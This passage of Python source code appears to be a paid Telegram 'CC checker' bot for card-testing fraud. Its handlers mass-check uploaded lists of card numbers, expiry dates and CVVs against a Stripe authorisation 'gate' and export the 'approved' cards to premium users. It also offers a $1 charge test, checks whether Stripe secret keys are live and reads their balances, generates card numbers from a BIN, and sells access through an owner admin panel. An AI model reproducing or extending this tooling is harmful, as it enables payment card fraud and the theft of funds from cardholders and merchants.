            output += f"{icon} `{card['cc'][:6]}xxxx{card['cc'][-4:]}|{card['mes']}|{card['ano']}|{card['cvv']}`\n"
            output += f"   ├ Status: `{result.get('msg', 'N/A')[:20]}`\n"
            output += f"   └ Time: `{result.get('time', 'N/A')}`\n\n"
        
        if len(results) > 10:
            output += f"...and {len(results)-10} more\n"
        
        output += f"\n👤 **By:** [{msg.from_user.first_name}](tg://user?id={msg.from_user.id}) [`{level}`]"
        
        await status_msg.edit_text(output, disable_web_page_preview=True)
        
        # Generate detailed file for premium
        if level in ["OWNER", "PREMIUM"] and approved_count > 0:
            approved_file = "approved_cards.txt"
            with open(approved_file, "w") as f:
                for card, result, _ in results:
                    if "GREEN" in result.get("code", "").upper():
                        f.write(f"{card['cc']}|{card['mes']}|{card['ano']}|{card['cvv']}\n")
            
            with open(approved_file, "rb") as f:
                await msg.reply_document(
                    f,
                    caption=f"✅ **{approved_count} Approved Cards**"
                )
            os.remove(approved_file)


# ── FILE UPLOAD HANDLER ──
@dp.message_handler(content_types=ContentTypes.DOCUMENT)
async def handle_document(message: types.Message):
    user = message.from_user
    register_user(user.id, user.username or "", user.first_name)
    
    if not message.document.file_name.endswith(".txt"):
        return
    
    # Only process if it looks like cards
    file_bytes = await message.download(destination=BytesIO())
    file_bytes.seek(0)
    content = file_bytes.read().decode("utf-8", errors="ignore")
    
    cards = parse_card_lines(content)
    if not cards:
        return
    
    # Check access
    kk = await message.reply("📥 **File received!**\n🔄 Starting mass check...")
    has_access, level = await check_access(message, kk)
    if not has_access:
        return
    
    max_cards = 50 if level in ["OWNER", "PREMIUM"] else 10
    cards = cards[:max_cards]
    
    await kk.edit_text(f"📊 **Checking {len(cards)} cards...**")
    
    results = []
    approved_count = 0
    
    for i, card in enumerate(cards):
        result = stripe_auth(card["cc"], card["mes"], card["ano"], card["cvv"])
        is_approved = "GREEN" in result.get("code", "").upper()
        if is_approved:
            approved_count += 1
        
        bin_info = bin_lookup(card["cc"])
        results.append((card, result, bin_info))
        
        update_stats(approved=is_approved)
        increment_user_checks(user.id, approved=is_approved)
    
    # Output summary
    output = (
        f"📊 **Mass Check Complete**\n"
        f"━━━━━━━━━━━━━━━\n"
        f"📥 Total: `{len(results)}`\n"
        f"✅ Approved: `{approved_count}`\n"
        f"❌ Declined: `{len(results) - approved_count}`\n"
        f"📈 Rate: `{approved_count/len(results)*100:.1f}%`\n\n"
    )
    
    for card, result, _ in results[:10]:
        icon = "✅" if "GREEN" in result.get("code", "").upper() else "❌"
        output += f"{icon} `{card['cc'][:6]}xxxx{card['cc'][-4:]}|{card['mes']}|{card['ano']}|{card['cvv']}`\n"
        output += f"   └ `{result.get('msg', 'N/A')[:25]}` | `{result.get('time', 'N/A')}`\n"
    
    if len(results) > 10:
        output += f"\n...and {len(results)-10} more"
    
    await kk.edit_text(output, disable_web_page_preview=True)


# ── BIN LOOKUP ──
@dp.message_handler(commands=["bin"], commands_prefix=PREFIX)
async def cmd_bin(message: types.Message):
    user = message.from_user
    register_user(user.id, user.username or "", user.first_name)
    
    text = message.text[len("/bin "):].strip()
    if not text:
        return await message.reply("❌ **Usage:** `/bin 492181`", reply_markup=back_close_kb())
    
    bin_num = re.findall(r"\d+", text)
    if not bin_num or len(bin_num[0]) < 6:
        return await message.reply("❌ **Provide at least 6 digits**", reply_markup=back_close_kb())
    
    bin_num = bin_num[0][:6]
    
    kk = await message.reply("🔍 **Looking up BIN...**")
    
    if is_blacklisted(bin_num):
        return await kk.edit_text(f"🚫 **BIN {bin_num} is BLACKLISTED**", reply_markup=back_close_kb())
    
    data = bin_lookup(bin_num)
    info = format_bin_info(data)
    
    await kk.edit_text(
        f"{info}\n\n"
        f"👤 **Checked by:** [{user.first_name}](tg://user?id={user.id})",
        reply_markup=back_close_kb(), disable_web_page_preview=True
    )


# ── SK KEY CHECK ──
@dp.message_handler(commands=["sk", "key"], commands_prefix=PREFIX)
async def cmd_sk(message: types.Message):
    user = message.from_user
    register_user(user.id, user.username or "", user.first_name)
    
    sk_key = message.text[len(message.text.split()[0]):].strip()
    if not sk_key:
        return await message.reply(
            "❌ **Usage:** `/sk sk_live_xxxxx`\n"
            "Or: `/sk sk_test_xxxxx`",
            reply_markup=back_close_kb()
        )
    
    await message.answer_chat_action("typing")
    kk = await message.reply("🔑 **Checking Stripe Key...**")
    
    result = check_sk_key(sk_key)
    
    if result.get("live"):
        output = (
            f"╔══════════════════════════════╗\n"
            f"║      ✅ **LIVE STRIPE KEY**     ║\n"
            f"╚══════════════════════════════╝\n\n"
            f"🔑 **Key:** `{sk_key[:12]}...{sk_key[-4:]}`\n"
            f"💰 **Balance:** `${result['balance']:,.2f}` {result['currency']}\n"
            f"🏛️ **Account:** `{result['account_name']}`\n"
            f"🌍 **Country:** `{result['country']}`\n"
            f"💳 **Charges:** {'✅ Enabled' if result['charges_enabled'] else '❌ Disabled'}\n"
            f"💸 **Payouts:** {'✅ Enabled' if result['payouts_enabled'] else '❌ Disabled'}\n\n"
            f"📌 **Status: LIVE ✅**\n\n"
            f"👤 **Checked by:** [{user.first_name}](tg://user?id={user.id})"
        )
    else:
        output = (
            f"╔══════════════════════════════╗\n"
            f"║      ❌ **DEAD STRIPE KEY**    ║\n"
            f"╚══════════════════════════════╝\n\n"
            f"🔑 **Key:** `{sk_key[:12]}...{sk_key[-4:]}`\n"
            f"📌 **Status:** `{result.get('error', 'Invalid Key')}`\n\n"
            f"👤 **Checked by:** [{user.first_name}](tg://user?id={user.id})"
        )
    
    await kk.edit_text(output, disable_web_page_preview=True)


# ── CC GENERATOR ──
@dp.message_handler(commands=["gen", "generate"], commands_prefix=PREFIX)
async def cmd_gen(message: types.Message):
    user = message.from_user
    register_user(user.id, user.username or "", user.first_name)
    
    text = message.text[len(message.text.split()[0]):].strip()
    if not text:
        return await message.reply(
            "❌ **Usage:**\n`/gen 492181` - 15 cards with random dates\n"
            "`/gen 492181 12 25 123` - specified details\n"
            "`/gen 492181 12 25 123 20` - 20 cards",
            reply_markup=back_close_kb()
        )
    
    parts = text.split()
    cc = parts[0]
    if not cc.isdigit() or len(cc) < 6:
        return await message.reply("❌ **Invalid BIN**", reply_markup=back_close_kb())
    
    mes = parts[1] if len(parts) > 1 else "x"
    ano = parts[2] if len(parts) > 2 else "x"
    cvv = parts[3] if len(parts) > 3 else "x"
    amount = min(int(parts[4]), 50) if len(parts) > 4 and parts[4].isdigit() else 15
    
    generated = []
    for _ in range(amount):
        rest = "".join(random.choices("0123456789", k=16 - len(cc)))
        gen_cc = (cc + rest)[:16]
        if cc[0] == "3":
            gen_cc = gen_cc[:15]
        
        gen_mes = mes if mes != "x" else f"{random.randint(1,12):02d}"
        gen_ano = ano if ano != "x" else str(random.randint(2024, 2029))
        gen_cvv = cvv if cvv != "x" else str(random.randint(1000, 9999) if cc[0] == "3" else random.randint(100, 999))
        
        generated.append(f"`{gen_cc}|{gen_mes}|{gen_ano[-2:] if len(gen_ano)==4 else gen_ano}|{gen_cvv}`")
    
    output = (
        f"♠️ **Cards Generated**\n"
        f"━━━━━━━━━━━━━━━\n"
        f"📊 **Amount:** `{amount}`\n"
        f"🏦 **BIN:** `{cc[:6]}`\n\n"
        + "\n".join(generated[:20])
    )
    
    if amount > 20:
        output += f"\n\n...and {amount - 20} more"
    
    output += f"\n\n👤 **By:** [{user.first_name}](tg://user?id={user.id})"
    
    await message.reply(output, disable_web_page_preview=True)


# ── STATS ──
@dp.message_handler(commands=["stats"], commands_prefix=PREFIX)
async def cmd_stats(message: types.Message):
    user = message.from_user
    register_user(user.id, user.username or "", user.first_name)
    level = get_level(user.id)
    
    if level not in ["OWNER", "PREMIUM"]:
        return await message.reply("🚫 **Stats available for Premium+ only**", reply_markup=back_close_kb())
    
    # Today's stats
    today = datetime.now().strftime("%Y-%m-%d")
    today_row = db_fetch_one("SELECT total_checks, total_approved, total_declined FROM stats WHERE date=?", (today,))
    
    # All time
    all_rows = db_fetch("SELECT SUM(total_checks), SUM(total_approved), SUM(total_declined) FROM stats")
    total_checks = all_rows[0][0] or 0
    total_approved = all_rows[0][1] or 0
    total_declined = all_rows[0][2] or 0
    
    # Users count
    user_count = db_fetch_one("SELECT COUNT(*) FROM users")[0]
    premium_count = db_fetch_one("SELECT COUNT(*) FROM premium")[0]
    
    t_checks = today_row[0] if today_row else 0
    t_approved = today_row[1] if today_row else 0
    t_declined = today_row[2] if today_row else 0
    
    output = (
        f"📊 **Bot Statistics**\n"
        f"━━━━━━━━━━━━━━━\n\n"
        f"📅 **Today (`{today}`)**\n"
        f"├ Checks: `{t_checks}`\n"
        f"├ ✅ Approved: `{t_approved}`\n"
        f"└ ❌ Declined: `{t_declined}`\n\n"
        f"📈 **All Time**\n"
        f"├ Total Checks: `{total_checks}`\n"
        f"├ ✅ Approved: `{total_approved}`\n"
        f"├ ❌ Declined: `{total_declined}`\n"
        f"└ 📊 Rate: `{f'{total_approved/total_checks*100:.1f}%' if total_checks > 0 else '0%'}`\n\n"
        f"👥 **Users**\n"
        f"├ Total: `{user_count}`\n"
        f"└ 💎 Premium: `{premium_count}`"
    )
    
    await message.reply(output, reply_markup=back_close_kb(), disable_web_page_preview=True)


# ═══════════════════════════════════════════════════════════════
# 👑 ADMIN COMMANDS
# ═══════════════════════════════════════════════════════════════

@dp.message_handler(commands=["admin", "panel"], commands_prefix=PREFIX)
async def cmd_admin(message: types.Message):
    user_id = message.from_user.id
    if user_id != OWNER_ID:
        return await message.reply("🚫 **Owner only**")
    
    kb = InlineKeyboardMarkup(row_width=2)
    kb.add(
        InlineKeyboardButton("➕ Add Premium", callback_data="admin_add"),
        InlineKeyboardButton("➖ Remove Premium", callback_data="admin_remove"),
    )
    kb.add(
        InlineKeyboardButton("📋 List Premium", callback_data="admin_list"),
        InlineKeyboardButton("🚫 Ban User", callback_data="admin_ban"),
    )
    kb.add(
        InlineKeyboardButton("📊 Full Stats", callback_data="admin_stats"),
        InlineKeyboardButton("🤖 Bot Info", callback_data="admin_info"),
    )
    kb.add(
        InlineKeyboardButton("➕ Auth Group", callback_data="admin_addgp"),
        InlineKeyboardButton("🗑️ Reset Stats", callback_data="admin_reset"),
    )
    kb.add(InlineKeyboardButton("🔚 Close", callback_data="close"))
    
    await message.reply("👑 **Admin Panel**\nSelect an option:", reply_markup=kb)


@dp.callback_query_handler(text=["admin_add", "admin_remove", "admin_list", "admin_ban",
                                  "admin_stats", "admin_info", "admin_addgp", "admin_reset",
                                  "admin_main"])
async def admin_callback(call: types.CallbackQuery):
    user_id = call.from_user.id
    if user_id != OWNER_ID:
        return await call.answer("🚫 Unauthorized", show_alert=True)
    
    data = call.data
    
    if data == "admin_add":
        await call.message.edit_text(
            "👑 **Add Premium**\n\n"
            "Reply to a user with `/ap` to add them\n"
            "Or use: `/ap USER_ID`\n\n"
            "Example: `/ap 123456789`",
            reply_markup=back_close_kb()
        )
    
    elif data == "admin_remove":
        await call.message.edit_text(
            "👑 **Remove Premium**\n\n"
            "Reply to a user with `/demote` to remove\n"
            "Or use: `/demote USER_ID`\n\n"
            "Example: `/demote 123456789`",
            reply_markup=back_close_kb()
        )
    
    elif data == "admin_list":
        rows = db_fetch("SELECT user_id FROM premium ORDER BY added_at DESC")
        if not rows:
            return await call.message.edit_text("📋 **No premium users**", reply_markup=back_close_kb())
        
        text = "👑 **Premium Users**\n━━━━━━━━━━━━━━━\n"
        for i, row in enumerate(rows, 1):
            uid = row[0]
            text += f"{i}. [{uid}](tg://user?id={uid}) (`{uid}`)\n"
        
        await call.message.edit_text(text, reply_markup=back_close_kb(), disable_web_page_preview=True)
    
    elif data == "admin_stats":
        # Get detailed stats
        all_rows = db_fetch("SELECT date, total_checks, total_approved, total_declined FROM stats ORDER BY date DESC LIMIT 7")
        
        text = "📊 **7-Day Statistics**\n━━━━━━━━━━━━━━━\n\n"
        for row in all_rows:
            date, checks, approved, declined = row
            text += f"📅 **{date}**\n"
            text += f"├ Checks: `{checks}` | ✅ `{approved}` | ❌ `{declined}`\n"
            rate = f"{approved/checks*100:.1f}%" if checks > 0 else "0%"
            text += f"└ Rate: `{rate}`\n\n"
        
        if not all_rows:
            text += "No data yet."
        
        await call.message.edit_text(text, reply_markup=back_close_kb(), disable_web_page_preview=True)
    
    elif data == "admin_info":
        uptime_seconds = time.time() - start_time
        uptime_str = str(timedelta(seconds=int(uptime_seconds)))
        
        user_count = db_fetch_one("SELECT COUNT(*) FROM users")[0]
        premium_count = db_fetch_one("SELECT COUNT(*) FROM premium")[0]
        group_count = db_fetch_one("SELECT COUNT(*) FROM authorized_groups")[0]
        blacklist_count = db_fetch_one("SELECT COUNT(*) FROM blacklist")[0]
        
        text = (
            f"🤖 **Bot Information**\n"
            f"━━━━━━━━━━━━━━━\n"
            f"⏱️ **Uptime:** `{uptime_str}`\n"
            f"👥 **Users:** `{user_count}`\n"
            f"💎 **Premium:** `{premium_count}`\n"
            f"🏘️ **Groups:** `{group_count}`\n"
            f"🚫 **Blacklisted:** `{blacklist_count}`\n"
            f"👑 **Owner:** `{OWNER_ID}`\n"
            f"⚙️ **Engine:** `Stripe Auth v3.0`"
        )
        
        await call.message.edit_text(text, reply_markup=back_close_kb(), disable_web_page_preview=True)
    
    elif data == "admin_addgp":
        await call.message.edit_text(
            "👑 **Authorize Group**\n\n"
            "Add this bot to your group\n"
            "Then send `/addgp` in the group\n"
            "Or use: `/addgp GROUP_ID`\n\n"
            "Current groups:",
            reply_markup=back_close_kb()
        )
        
        groups = db_fetch("SELECT group_id FROM authorized_groups")
        if groups:
            gtext = "\n".join([f"`{g[0]}`" for g in groups])
            await call.message.reply(f"📋 **Authorized Groups:**\n{gtext}")
    
    elif data == "admin_reset":
        db_exec("DELETE FROM stats")
        await call.message.edit_text("✅ **Stats reset complete**", reply_markup=back_close_kb())

    elif data == "admin_main":
        kb = InlineKeyboardMarkup(row_width=2)
        kb.add(
            InlineKeyboardButton("➕ Add Premium", callback_data="admin_add"),
            InlineKeyboardButton("➖ Remove Premium", callback_data="admin_remove"),
        )
        kb.add(
            InlineKeyboardButton("📋 List Premium", callback_data="admin_list"),
            InlineKeyboardButton("🚫 Ban User", callback_data="admin_ban"),
        )
        kb.add(
            InlineKeyboardButton("📊 Full Stats", callback_data="admin_stats"),
            InlineKeyboardButton("🤖 Bot Info", callback_data="admin_info"),
        )
        kb.add(
            InlineKeyboardButton("➕ Auth Group", callback_data="admin_addgp"),
            InlineKeyboardButton("🗑️ Reset Stats", callback_data="admin_reset"),
        )
        kb.add(InlineKeyboardButton("🔚 Close", callback_data="close"))
        
        await call.message.edit_text("👑 **Admin Panel**\nSelect an option:", reply_markup=kb)


@dp.message_handler(commands=["ap"], commands_prefix=PREFIX)
async def cmd_add_premium(message: types.Message):
    if message.from_user.id != OWNER_ID:
        return await message.reply("🚫 **Owner only**")
    
    try:
        if message.reply_to_message:
            uid = message.reply_to_message.from_user.id
            name = message.reply_to_message.from_user.first_name
        else:
            uid = int(message.text[len("/ap "):].strip())
            name = str(uid)
    except:
        return await message.reply("❌ **Usage:** Reply to user or `/ap USER_ID`")
    
    add_premium(uid, OWNER_ID)
    await message.reply(
        f"✅ **Premium Added!**\n\n"
        f"User: [{name}](tg://user?id={uid})\n"
        f"ID: `{uid}`\n"
        f"Added by: {OWNER_USERNAME}\n\n"
        f"They now have access to all premium gates."
    )


@dp.message_handler(commands=["demote"], commands_prefix=PREFIX)
async def cmd_demote(message: types.Message):
    if message.from_user.id != OWNER_ID:
        return await message.reply("🚫 **Owner only**")
    
    try:
        if message.reply_to_message:
            uid = message.reply_to_message.from_user.id
            name = message.reply_to_message.from_user.first_name
        else:
            uid = int(message.text[len("/demote "):].strip())
            name = str(uid)
    except:
        return await message.reply("❌ **Usage:** Reply to user or `/demote USER_ID`")
    
    remove_premium(uid)
    await message.reply(f"✅ **Premium Removed**\nUser: [{name}](tg://user?id={uid})")


@dp.message_handler(commands=["addgp"], commands_prefix=PREFIX)
async def cmd_addgp(message: types.Message):
    if message.from_user.id != OWNER_ID:
        return await message.reply("🚫 **Owner only**")
    
    gid = message.chat.id
    try:
        db_exec("INSERT OR IGNORE INTO authorized_groups (group_id, added_by) VALUES (?,?)", (gid, OWNER_ID))
        await message.reply(f"✅ **Group Authorized**\n`{gid}`\n{message.chat.title}")
    except Exception as e:
        await message.reply(f"❌ Error: {e}")


@dp.message_handler(commands=["delgp"], commands_prefix=PREFIX)
async def cmd_delgp(message: types.Message):
    if message.from_user.id != OWNER_ID:
        return await message.reply("🚫 **Owner only**")
    
    gid = message.chat.id
    db_exec("DELETE FROM authorized_groups WHERE group_id=?", (gid,))
    await message.reply(f"✅ **Group Deauthorized**")


@dp.message_handler(commands=["blacklist"], commands_prefix=PREFIX)
async def cmd_blacklist(message: types.Message):
    if message.from_user.id != OWNER_ID:
        return await message.reply("🚫 **Owner only**")
    
    text = message.text[len("/blacklist "):].strip()
    bin_num = re.findall(r"\d+", text)
    if not bin_num or len(bin_num[0]) < 6:
        return await message.reply("❌ **Provide 6-digit BIN**")
    
    bin_num = bin_num[0][:6]
    db_exec("INSERT OR IGNORE INTO blacklist (bin, added_by) VALUES (?,?)", (bin_num, OWNER_ID))
    await message.reply(f"🚫 **BIN {bin_num} Blacklisted**")


@dp.message_handler(commands=["unblacklist", "rblack"], commands_prefix=PREFIX)
async def cmd_unblacklist(message: types.Message):
    if message.from_user.id != OWNER_ID:
        return await message.reply("🚫 **Owner only**")
    
    text = message.text[len(message.text.split()[0]):].strip()
    bin_num = re.findall(r"\d+", text)
    if not bin_num or len(bin_num[0]) < 6:
        return await message.reply("❌ **Provide 6-digit BIN**")
    
    bin_num = bin_num[0][:6]
    db_exec("DELETE FROM blacklist WHERE bin=?", (bin_num,))
    await message.reply(f"✅ **BIN {bin_num} Removed from Blacklist**")


@dp.message_handler(commands=["broadcast"], commands_prefix=PREFIX)
async def cmd_broadcast(message: types.Message):
    if message.from_user.id != OWNER_ID:
        return await message.reply("🚫 **Owner only**")
    
    text = message.text[len("/broadcast "):].strip()
    if not text:
        return await message.reply("❌ **Usage:** `/broadcast Your message here`")
    
    users = db_fetch("SELECT user_id FROM users")
    sent = 0
    failed = 0
    
    status = await message.reply(f"📡 **Broadcasting to {len(users)} users...**")
    
    for row in users:
        try:
            kb = InlineKeyboardMarkup()
            kb.add(InlineKeyboardButton("🤖 Use Bot", url=f"https://t.me/{(await bot.get_me()).username}"))
            await bot.send_message(row[0], f"📢 **Broadcast**\n\n{text}", reply_markup=kb, disable_web_page_preview=True)
            sent += 1
            await asyncio.sleep(0.05)
        except:
            failed += 1
    
    await status.edit_text(f"✅ **Broadcast Complete**\n📤 Sent: `{sent}`\n❌ Failed: `{failed}`")


# ═══════════════════════════════════════════════════════════════
# 🔘 CALLBACK HANDLERS (UI Navigation)
# ═══════════════════════════════════════════════════════════════

@dp.callback_query_handler(text=["main_menu", "check_menu", "tools_menu", "my_stats",
                                  "premium_info", "help_menu", "close"])
async def main_callbacks(call: types.CallbackQuery):
    data = call.data
    
    if data == "main_menu":
        await call.message.edit_text(
            "📋 **Command Center**\nChoose a category:",
            reply_markup=main_menu_kb(), disable_web_page_preview=True
        )
    
    elif data == "check_menu":
        level = get_level(call.from_user.id)
        kb = InlineKeyboardMarkup(row_width=2)
        kb.add(
            InlineKeyboardButton("💳 Single Check", callback_data="gate_chk"),
            InlineKeyboardButton("📤 Mass Check", callback_data="gate_mass"),
        )
        kb.add(
            InlineKeyboardButton("💵 Charge $1", callback_data="gate_charge"),
        )
        kb.add(
            InlineKeyboardButton("🔙 Back", callback_data="main_menu"),
            InlineKeyboardButton("🔚 Close", callback_data="close"),
        )
        
        await call.message.edit_text(
            f"💳 **CC Checker Gates**\n"
            f"━━━━━━━━━━━━━━━\n"
            f"👤 Your Level: `{level}`\n\n"
            f"**Available Gates:**\n"
            f"✅ **Stripe Auth** (non-3D) - `/chk`\n"
            f"✅ **$1 Charge Test** - `/charge` (Premium)\n"
            f"✅ **Mass Check** - `/mass` or send `.txt`\n"
            f"✅ **SK Key Check** - `/sk`\n\n"
            f"Select a gate below or use commands:",
            reply_markup=kb, disable_web_page_preview=True
        )
    
    elif data == "gate_chk":
        await call.message.edit_text(
            "💳 **Single Card Check**\n\n"
            "Send: `/chk 4921811111111111|12|25|123`\n\n"
            "Or reply to a card with `/chk`\n\n"
            "✅ **Gate:** Stripe Auth (non-3D)\n"
            "📊 Checks BIN + Luhn + Auth",
            reply_markup=back_close_kb(), disable_web_page_preview=True
        )
    
    elif data == "gate_mass":
        await call.message.edit_text(
            "📤 **Mass Check**\n\n"
            "**Method 1:** Send `.txt` file with cards\n"
            "**Method 2:** `/mass` then attach file\n\n"
            "Format: One card per line\n"
            "`4921811111111111|12|25|123`\n\n"
            "📊 Limits:\n"
            "├ Free: `10` cards\n"
            "└ Premium: `50` cards",
            reply_markup=back_close_kb(), disable_web_page_preview=True
        )
    
    elif data == "gate_charge":
        level = get_level(call.from_user.id)
        if level not in ["OWNER", "PREMIUM"]:
            return await call.answer("🔒 Premium gate only", show_alert=True)
        
        await call.message.edit_text(
            "💵 **$1 Charge Test**\n\n"
            "Send: `/charge 4921811111111111|12|25|123`\n\n"
            "⚠️ This will attempt to charge $1\n"
            "✅ If approved, refund available\n\n"
            "🔒 **Premium Gate**",
            reply_markup=back_close_kb(), disable_web_page_preview=True
        )
    
    elif data == "tools_menu":
        kb = InlineKeyboardMarkup(row_width=2)
        kb.add(
            InlineKeyboardButton("🔍 BIN Lookup", callback_data="tool_bin"),
            InlineKeyboardButton("🔑 SK Check", callback_data="tool_sk"),
        )
        kb.add(
            InlineKeyboardButton("♠️ Card Gen", callback_data="tool_gen"),
            InlineKeyboardButton("📊 Stats", callback_data="tool_stats"),
        )
        kb.add(
            InlineKeyboardButton("🔙 Back", callback_data="main_menu"),
            InlineKeyboardButton("🔚 Close", callback_data="close"),
        )
        
        await call.message.edit_text(
            "🔍 **Tools & Utilities**\n"
            "━━━━━━━━━━━━━━━\n\n"
            "Select a tool below or use commands:",
            reply_markup=kb, disable_web_page_preview=True
        )
    
    elif data == "tool_bin":
        await call.message.edit_text(
            "🔍 **BIN Lookup**\n\n"
            "Send: `/bin 492181`\n\n"
            "Returns: Bank, Country, Type, Brand\n"
            "✅ Free for all users",
            reply_markup=back_close_kb(), disable_web_page_preview=True
        )
    
    elif data == "tool_sk":
        await call.message.edit_text(
            "🔑 **Stripe Key Checker**\n\n"
            "Send: `/sk sk_live_xxxxx`\n\n"
            "Returns: Balance, Account Info, Status\n"
            "✅ Free for all users",
            reply_markup=back_close_kb(), disable_web_page_preview=True
        )
    
    elif data == "tool_gen":
        await call.message.edit_text(
            "♠️ **Card Generator**\n\n"
            "`/gen 492181` - 15 random cards\n"
            "`/gen 492181 12 25 123 20` - 20 cards\n\n"
            "✅ Free for all users",
            reply_markup=back_close_kb(), disable_web_page_preview=True
        )
    
    elif data == "tool_stats":
        # Inline stats
        user_row = db_fetch_one("SELECT total_checks, total_approved FROM users WHERE user_id=?", (call.from_user.id,))
        checks = user_row[0] if user_row else 0
        approved = user_row[1] if user_row else 0
        
        await call.message.edit_text(
            f"📊 **Your Stats**\n"
            f"━━━━━━━━━━━━━━━\n"
            f"Total Checks: `{checks}`\n"
            f"Approved: `{approved}`\n"
            f"Declined: `{checks - approved}`\n"
            f"Rate: `{f'{approved/checks*100:.1f}%' if checks > 0 else '0%'}`\n\n"
            f"📈 **Bot Stats:** `/stats`",
            reply_markup=back_close_kb(), disable_web_page_preview=True
        )
    
    elif data == "my_stats":
        user_row = db_fetch_one("SELECT total_checks, total_approved FROM users WHERE user_id=?", (call.from_user.id,))
        checks = user_row[0] if user_row else 0
        approved = user_row[1] if user_row else 0
        
        await call.message.edit_text(
            f"📊 **Your Statistics**\n"
            f"━━━━━━━━━━━━━━━\n"
            f"👤 Level: `{get_level(call.from_user.id)}`\n"
            f"📥 Total Checks: `{checks}`\n"
            f"✅ Approved: `{approved}`\n"
            f"❌ Declined: `{checks - approved}`\n"
            f"📈 Rate: `{f'{approved/checks*100:.1f}%' if checks > 0 else '0%'}`",
            reply_markup=back_close_kb(), disable_web_page_preview=True
        )
    
    elif data == "premium_info":
        kb = InlineKeyboardMarkup()
        kb.add(InlineKeyboardButton("💬 Contact Owner", url=SUPPORT_GROUP))
        kb.add(InlineKeyboardButton("🔙 Back", callback_data="main_menu"))
        kb.add(InlineKeyboardButton("🔚 Close", callback_data="close"))
        
        await call.message.edit_text(
            "💎 **Premium Plan**\n"
            f"━━━━━━━━━━━━━━━\n\n"
            "**Benefits:**\n"
            "✅ Private chat access\n"
            "✅ No anti-spam limits\n"
            f"✅ Up to 50 cards per mass check\n"
            "✅ $1 Charge test gate\n"
            "✅ Priority support\n"
            "✅ Approved card file export\n\n"
            "**Price:** Contact for pricing\n\n"
            f"📞 **Contact:** {OWNER_USERNAME}",
            reply_markup=kb, disable_web_page_preview=True
        )
    
    elif data == "help_menu":
        kb = InlineKeyboardMarkup(row_width=2)
        kb.add(
            InlineKeyboardButton("💳 Check", callback_data="check_menu"),
            InlineKeyboardButton("🔍 Tools", callback_data="tools_menu"),
        )
        kb.add(
            InlineKeyboardButton("💎 Premium", callback_data="premium_info"),
            InlineKeyboardButton("🔙 Back", callback_data="main_menu"),
        )
        kb.add(InlineKeyboardButton("🔚 Close", callback_data="close"))
        
        await call.message.edit_text(
            "❓ **Help Center**\n"
            "━━━━━━━━━━━━━━━\n\n"
            "**Quick Commands:**\n"
            "`/chk` - Check one card\n"
            "`/bin` - Lookup BIN\n"
            "`/sk` - Check Stripe key\n"
            "`/gen` - Generate cards\n"
            "`/mass` - Mass check\n"
            "`/stats` - Bot statistics\n"
            "`/me` - Your profile\n\n"
            "📤 **Mass Check:**\n"
            "Send a `.txt` file with cards\n"
            "Format: `cc|mm|yy|cvv` per line\n\n"
            "💡 **Tips:**\n"
            "• Check BIN first with `/bin`\n"
            "• Free users: use in authorized groups\n"
            "• Premium = private access + no limits",
            reply_markup=kb, disable_web_page_preview=True
        )
    
    elif data == "close":
        try:
            await call.message.delete()
        except:
            await call.message.edit_text("✅ Closed")


# ═══════════════════════════════════════════════════════════════
# 🚀 ERROR HANDLER
# ═══════════════════════════════════════════════════════════════

@dp.errors_handler()
async def error_handler(update, error):
    log.error(f"Update {update} caused error {error}")
    return True


# ═══════════════════════════════════════════════════════════════
# 🏁 MAIN ENTRY POINT
# ═══════════════════════════════════════════════════════════════

if __name__ == "__main__":
    # Record start time
    start_time = time.time()
    
    # Print banner
    banner = """
╔═══════════════════════════════════════════════════════════════╗
║              💎 PREMIUM CC CHECKER BOT V3.0 💎               ║
║         Advanced Multi-Gateway Card Checking System          ║
║                                                              ║
║   🔧 Owner ID: {owner_id}                                      
║   🚀 Engine: Stripe Auth + Charge                            ║
║   📊 DB: SQLite3                                             ║
╚═══════════════════════════════════════════════════════════════╝
    """.format(owner_id=OWNER_ID)
    
    print(banner)
    
    # Init DB
    init_db()
    
    # Ensure owner exists as premium
    add_premium(OWNER_ID, OWNER_ID)
    
    # Start polling
    log.info("🤖 Bot is running...")
    executor.start_polling(dp, skip_updates=True)
